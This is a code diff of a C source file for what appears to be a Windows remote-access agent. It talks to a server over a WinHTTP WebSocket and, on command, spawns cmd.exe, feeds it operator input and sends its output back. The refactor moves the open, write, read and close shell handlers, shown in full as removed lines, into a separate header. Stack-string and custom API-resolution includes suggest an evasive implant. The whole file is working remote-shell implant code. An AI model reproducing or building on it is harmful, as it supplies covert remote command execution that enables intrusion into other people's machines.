@@ -1,10 +1,5 @@
 #include "winhttp_api.h"
-#include "protocol.h"
-#include "wire.h"
-#include "transport.h"
-#include "shell.h"
 #include "identity_headers.h"
-#include "types.h"
 #include "wintypes.h"
 #include "memory.h"
 #include "string.h"
@@ -12,141 +7,7 @@
 #include "kernel32.h"
 #include "entry.h"
 #include "stackstrings.h"
-
-typedef struct {
-    shell_slot *shells;
-    int verbose;
-    const WINHTTP_API *winhttp;
-} agent_ctx;
-
-
-static DWORD handle_open_shell(const agent_ctx *ctx, unsigned int corr_id, unsigned char *reply, DWORD *reply_len)
-{
-    int id = shell_open(ctx->shells);
-
-    if (id < 0) {
-        unsigned char status_error[8];
-        status_error[0]=1; status_error[1]=0; status_error[2]=0; status_error[3]=0;
-        status_error[4]=0; status_error[5]=0; status_error[6]=0; status_error[7]=0;
-
-        write_u32_le_at(status_error, 4, corr_id);
-
-        MemoryCopy(reply, status_error, sizeof(status_error));
-        *reply_len = sizeof(status_error);
-        
-        LOG_ERROR("OpenShell failed - replied status 1 (corr=%u)", corr_id);
-        return STATUS_ERROR;
-    }
-
-    int pos = 0;
-    write_u32_le(reply, &pos, STATUS_OK);
-    write_u32_le(reply, &pos, corr_id);
-    write_u64_le(reply, &pos, (unsigned long long)id);
-
-    *reply_len = 16;
-    LOG_INFO("Shell with ID %d opened (cmd.exe spawned)", id);
-    return STATUS_OK;
-}
-
-static DWORD handle_write_shell(const agent_ctx *ctx, const incoming_message *msg, unsigned int corr_id, unsigned char *reply, DWORD *reply_len)
-{
-    unsigned long long id = 0;
-    for (int i = 12; i >= 5; i--)
-        id = (id << 8) | msg->data[i];
-
-    shell_slot *slot = shell_lookup(ctx->shells, id);
-
-    int status = STATUS_ERROR;
-    if (slot) {
-        DWORD end = msg->length;
-        while (end > 13 && msg->data[end - 1] == '\0')
-            end--;
-        if (end > 13 && shell_write(slot, msg->data + 13, end - 13) == 0)
-            status = STATUS_OK;
-    }
-
-    int pos = 0;
-    write_u32_le(reply, &pos, (DWORD)status);
-    write_u32_le(reply, &pos, corr_id);
-    *reply_len = 8;
-    LOG_INFO("Write to shell %u: %lu byte(s)", (UINT32)id, (unsigned long)(msg->length - 13));
-    return (DWORD)status;
-}
-
-static DWORD handle_read_shell(const agent_ctx *ctx, const incoming_message *msg, unsigned int corr_id, unsigned char *reply, DWORD *reply_len)
-{
-    unsigned long long id = 0;
-    for (int i = 12; i >= 5; i--)
-        id = (id << 8) | msg->data[i];
-
-    shell_slot *slot = shell_lookup(ctx->shells, id);
-    if (!slot) {
-        unsigned char status_error[8];
-        status_error[0]=1; status_error[1]=0; status_error[2]=0; status_error[3]=0;
-        status_error[4]=0; status_error[5]=0; status_error[6]=0; status_error[7]=0;
-
-        write_u32_le_at(status_error, 4, corr_id);
-        MemoryCopy(reply, status_error, sizeof(status_error));
-
-        *reply_len = sizeof(status_error);
-        LOG_ERROR("Read shell with ID %u - unknown ID, replied status 1 (corr=%u)", (UINT32)id, corr_id);
-        return STATUS_ERROR;
-    }
-
-    unsigned char chunk[8 + SHELL_READ_CHUNK + 1];
-    DWORD got = 0;
-    int r = shell_read(slot, chunk + 8, SHELL_READ_CHUNK, &got);
-
-    if (r == SHELL_READ_DEAD) {
-        unsigned char status_error[8];
-        status_error[0]=1; status_error[1]=0; status_error[2]=0; status_error[3]=0;
-        status_error[4]=0; status_error[5]=0; status_error[6]=0; status_error[7]=0;
-
-        write_u32_le_at(status_error, 4, corr_id);
-        MemoryCopy(reply, status_error, sizeof(status_error));
-        *reply_len = sizeof(status_error);
-
-        LOG_ERROR("Shell %llu exited - status 1, slot freed (corr=%u)", id, corr_id);
-        return STATUS_ERROR;
-    }
-
-    int pos = 0;
-    write_u32_le(chunk, &pos, STATUS_OK);
-    write_u32_le(chunk, &pos, corr_id);
-
-    chunk[8 + got] = '\0';
-    MemoryCopy(reply, chunk, 8 + got + 1);
-
-    *reply_len = 8 + got + 1;
-
-    if (r == SHELL_READ_IDLE)
-        LOG_INFO("Read shell with ID %u - idle", (UINT32)id);
-    else
-        LOG_INFO("Read shell with ID %u - %lu byte(s)", (UINT32)id, (unsigned long)got);
-
-    return STATUS_OK;
-}
-
-static DWORD handle_close_shell(const agent_ctx *ctx, const incoming_message *msg, unsigned int corr_id, unsigned char *reply, DWORD *reply_len)
-{
-    unsigned long long id = 0;
-    for (int i = 12; i >= 5; i--)
-        id = (id << 8) | msg->data[i];
-
-    shell_slot *slot = shell_lookup(ctx->shells, id);
-    if (slot) {
-        shell_teardown(slot);
-        LOG_INFO("Shell with ID %u closed (cmd.exe terminated)", (UINT32)id);
-    } else {
-        LOG_INFO("Close shell with ID %u - not open (still ok)", (UINT32)id);
-    }
-
-    int pos = 0;
-    write_u32_le(reply, &pos, STATUS_OK);
-    write_u32_le(reply, &pos, corr_id);
-    *reply_len = 8;
-    return STATUS_OK;
-}
+#include "commands.h"
 
 static int run_session(const agent_ctx *ctx, const WCHAR *url, int *long_lived);
 
@@ -332,7 +193,7 @@ static int run_session(const agent_ctx *ctx, const WCHAR *url, int *long_lived)
 
         if (msg.truncated) {
             unsigned char status_error[8];
-            memset(status_error, 0, sizeof(status_error));
+            MemoryZero(status_error, sizeof(status_error));
 
             write_u32_le_at(status_error, 4, corr_id);
             err = winhttp.WinHttpWebSocketSend(socket, WINHTTP_WEB_SOCKET_BINARY_MESSAGE_BUFFER_TYPE, status_error, sizeof(status_error));
@@ -355,24 +216,24 @@ static int run_session(const agent_ctx *ctx, const WCHAR *url, int *long_lived)
         DWORD reply_len = 0;
 
         if (opcode == CMD_OPEN_SHELL) {
-            err = handle_open_shell(ctx, corr_id, reply, &reply_len);
+            err = Handle_ShellOpen(ctx, corr_id, reply, &reply_len);
             if (err == NO_ERROR || err == STATUS_ERROR)
                 err = winhttp.WinHttpWebSocketSend(socket, WINHTTP_WEB_SOCKET_BINARY_MESSAGE_BUFFER_TYPE, reply, reply_len);
         } else if (opcode == CMD_WRITE_SHELL && msg.length >= 13) {
-            err = handle_write_shell(ctx, &msg, corr_id, reply, &reply_len);
+            err = Handle_ShellWrite(ctx, &msg, corr_id, reply, &reply_len);
             if (err == STATUS_OK || err == STATUS_ERROR)
                 err = winhttp.WinHttpWebSocketSend(socket, WINHTTP_WEB_SOCKET_BINARY_MESSAGE_BUFFER_TYPE, reply, reply_len);
         } else if (opcode == CMD_READ_SHELL && msg.length >= 13) {
-            err = handle_read_shell(ctx, &msg, corr_id, reply, &reply_len);
+            err = Handle_ShellRead(ctx, &msg, corr_id, reply, &reply_len);
             if (err == STATUS_OK || err == STATUS_ERROR)
                 err = winhttp.WinHttpWebSocketSend(socket, WINHTTP_WEB_SOCKET_BINARY_MESSAGE_BUFFER_TYPE, reply, reply_len);
         } else if (opcode == CMD_CLOSE_SHELL && msg.length >= 13) {
-            err = handle_close_shell(ctx, &msg, corr_id, reply, &reply_len);
+            err = Handle_ShellClose(ctx, &msg, corr_id, reply, &reply_len);
             if (err == STATUS_OK || err == STATUS_ERROR)
                 err = winhttp.WinHttpWebSocketSend(socket, WINHTTP_WEB_SOCKET_BINARY_MESSAGE_BUFFER_TYPE, reply, reply_len);
         } else {
             unsigned char status_error[8];
-            memset(status_error, 0, sizeof(status_error));
+            MemoryZero(status_error, sizeof(status_error));
 
             write_u32_le_at(status_error, 4, corr_id);
             err = winhttp.WinHttpWebSocketSend(socket, WINHTTP_WEB_SOCKET_BINARY_MESSAGE_BUFFER_TYPE, status_error, sizeof(status_error));
